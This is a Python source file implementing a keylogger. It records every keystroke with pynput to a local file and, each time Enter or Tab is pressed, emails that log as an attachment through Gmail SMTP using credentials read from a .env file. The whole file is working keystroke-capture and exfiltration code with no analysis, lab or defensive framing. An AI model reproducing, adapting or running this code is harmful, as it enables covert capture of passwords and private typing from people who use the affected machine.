from pynput import keyboard
import smtplib
from email.message import EmailMessage
from dotenv import load_dotenv
import os
import mimetypes
# Cristian Zambrano
load_dotenv()

def keyPressed(key):
    with open("key_log.txt", "a") as logKey:
        try:
            if key == keyboard.Key.esc:
                return False 
            if key == keyboard.Key.enter or key == keyboard.Key.tab:
                # Obtener valores desde .env
                remitente = os.getenv("EMAIL_USER")
                destinatario = os.getenv("EMAIL_DEFAULT_RECEIVER", remitente)
                archivo = "key_log.txt" 
                enviar_correo(
                    destinatario=destinatario,
                    asunto="Registro de teclas",
                    cuerpo="Se ha presionado la tecla Enter o Tab.",
                    archivo_adjunto=archivo
                )
                key_name = "ENTER" if key == keyboard.Key.enter else "TAB"
                logKey.write(f"[{key_name}]")
            else:
                char = key.char
                logKey.write(char)
        except AttributeError:
            logKey.write(f"[{key.name.upper()}]")
        except Exception as e:
            print(f"An error occurred while logging the key: {e}")



def enviar_correo(destinatario, asunto, cuerpo, archivo_adjunto):
    remitente = os.getenv('EMAIL_USER')
    clave = os.getenv('EMAIL_PASSWORD')

    if not remitente or not clave:
        print("Error: Credenciales no encontradas en el archivo .env")
        return
    try:
        mensaje = EmailMessage()
        mensaje['Subject'] = asunto
        mensaje['From'] = remitente
        mensaje['To'] = destinatario
        mensaje.set_content(cuerpo)
        if archivo_adjunto:
            if not os.path.exists(archivo_adjunto):
                print(f"Advertencia: El archivo '{archivo_adjunto}' no existe.")
            else:
                tipo_mime, _ = mimetypes.guess_type(archivo_adjunto)
                tipo_mime = tipo_mime or 'application/octet-stream'
                tipo_principal, tipo_sub = tipo_mime.split('/', 1)

                with open(archivo_adjunto, 'rb') as f:
                    contenido = f.read()
                    mensaje.add_attachment(contenido, maintype=tipo_principal, subtype=tipo_sub,
                                           filename=os.path.basename(archivo_adjunto))

        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
            smtp.login(remitente, clave)
            smtp.send_message(mensaje)

        print("Correo enviado correctamente.")

    except Exception as e:
        print(f"Error al enviar el correo: {e}")


if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()